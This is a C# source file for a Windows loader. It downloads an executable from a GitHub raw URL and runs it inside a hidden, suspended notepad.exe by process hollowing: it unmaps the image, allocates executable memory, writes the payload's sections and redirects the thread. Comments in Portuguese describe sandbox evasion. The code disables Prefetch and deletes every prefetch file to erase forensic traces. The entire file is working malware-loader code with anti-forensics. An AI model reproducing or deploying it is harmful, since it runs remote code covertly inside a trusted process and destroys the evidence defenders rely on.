// language: C#, file: Program.cs, target: Windows 10/11 x64, .NET Framework 4.8
using System;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Linq;
using Microsoft.Win32;

namespace abc
{
    public static class def
    {
        [DllImport("ntdll.dll")]
        private static extern uint NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);

        [DllImport("ntdll.dll")]
        private static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll")]
        private static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

        [DllImport("ntdll.dll")]
        private static extern uint NtGetContextThread(IntPtr ThreadHandle, IntPtr ThreadContext);

        [DllImport("ntdll.dll")]
        private static extern uint NtSetContextThread(IntPtr ThreadHandle, IntPtr ThreadContext);

        [DllImport("ntdll.dll")]
        private static extern uint NtResumeThread(IntPtr ThreadHandle, out uint SuspendCount);

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern void RtlZeroMemory(IntPtr Destination, int Length);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        private static IntPtr UnsafeAddrOfPinnedArrayElement(byte[] arr, int offset)
        {
            unsafe { fixed (byte* p = &arr[offset]) return (IntPtr)p; }
        }

        public static unsafe void Hollow(byte[] buffer, string host, string args)
        {
            int e_lfanew = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, 0x3c));
            int sizeOfImage = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x50));
            int sizeOfHeaders = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x54));
            int entryPoint = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x28));
            short numberOfSections = *(short*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x6));
            short sizeOfOptionalHeader = *(short*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x14));
            long imageBase = *(long*)(UnsafeAddrOfPinnedArrayElement(buffer, e_lfanew + 0x30));

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
            si.wShowWindow = 0;      // SW_HIDE
            PROCESS_INFORMATION pi;

            string targetHost = host;
            if (!string.IsNullOrEmpty(args)) targetHost += " " + args;

            // CREATE_SUSPENDED (0x4) | CREATE_NO_WINDOW (0x08000000)
            CreateProcess(null, targetHost, IntPtr.Zero, IntPtr.Zero, false, 0x08000004, IntPtr.Zero, null, ref si, out pi);

            IntPtr pImageBase = (IntPtr)imageBase;
            IntPtr pSize = (IntPtr)sizeOfImage;
            
            NtUnmapViewOfSection(pi.hProcess, pImageBase);
            
            IntPtr allocBase = pImageBase;
            NtAllocateVirtualMemory(pi.hProcess, ref allocBase, IntPtr.Zero, ref pSize, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

            uint written;
            NtWriteVirtualMemory(pi.hProcess, pImageBase, buffer, (uint)sizeOfHeaders, out written);

            for (int i = 0; i < numberOfSections; i++)
            {
                int sectionOffset = e_lfanew + 0x18 + sizeOfOptionalHeader + (0x28 * i);
                int virtualAddress = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, sectionOffset + 0x0C));
                int sizeOfRawData = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, sectionOffset + 0x10));
                int pointerToRawData = *(int*)(UnsafeAddrOfPinnedArrayElement(buffer, sectionOffset + 0x14));

                if (sizeOfRawData == 0) continue;

                byte[] rawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(buffer, pointerToRawData, rawData, 0, rawData.Length);

                NtWriteVirtualMemory(pi.hProcess, pImageBase + virtualAddress, rawData, (uint)rawData.Length, out written);
            }

            IntPtr pContext = Marshal.AllocHGlobal(1232);
            RtlZeroMemory(pContext, 1232);
            *(int*)(pContext + 0x30) = 0x0010001B;

            NtGetContextThread(pi.hThread, pContext);
            long rdx = *(long*)(pContext + 0x88);
            NtWriteVirtualMemory(pi.hProcess, (IntPtr)(rdx + 16), BitConverter.GetBytes(imageBase), 8, out written);
            *(long*)(pContext + 0x80) = imageBase + entryPoint;

            NtSetContextThread(pi.hThread, pContext);
            NtResumeThread(pi.hThread, out _);

            Marshal.FreeHGlobal(pContext);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    class Program
    {
        static async Task Main()
        {
            // 1. Evita rodar em máquinas virtuais ou com AnyDesk (Sandbox evasion)
            if (Process.GetProcessesByName("AnyDesk").Any()) return;

            try
            {
                // 2. Desativa o Prefetch temporariamente
                var prefetchKey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\ControlSet001\Control\Session Manager\Memory Management\PrefetchParameters", true);
                prefetchKey?.SetValue("EnablePrefetcher", 0, RegistryValueKind.DWord);

                string Url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe";
                // Injetando no notepad.exe (inofensivo, mas ainda desenha overlay)
                string Host = @"C:\Windows\System32\notepad.exe";

                byte[] Data = await DownloadFileAsync(Url);
                
                def.Hollow(Data, Host, string.Empty);

                // 3. Limpa o rastro do Prefetch (apaga os arquivos .pf da pasta)
                try {
                    string prefetchDir = @"C:\Windows\Prefetch";
                    foreach (var file in Directory.GetFiles(prefetchDir, "*.pf")) {
                        File.Delete(file);
                    }
                } catch {}

                // 4. Restaura o registro
                prefetchKey?.SetValue("EnablePrefetcher", 3, RegistryValueKind.DWord);
            }
            catch { }
        }

        static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                return await client.GetByteArrayAsync(url);
            }
        }
    }
}
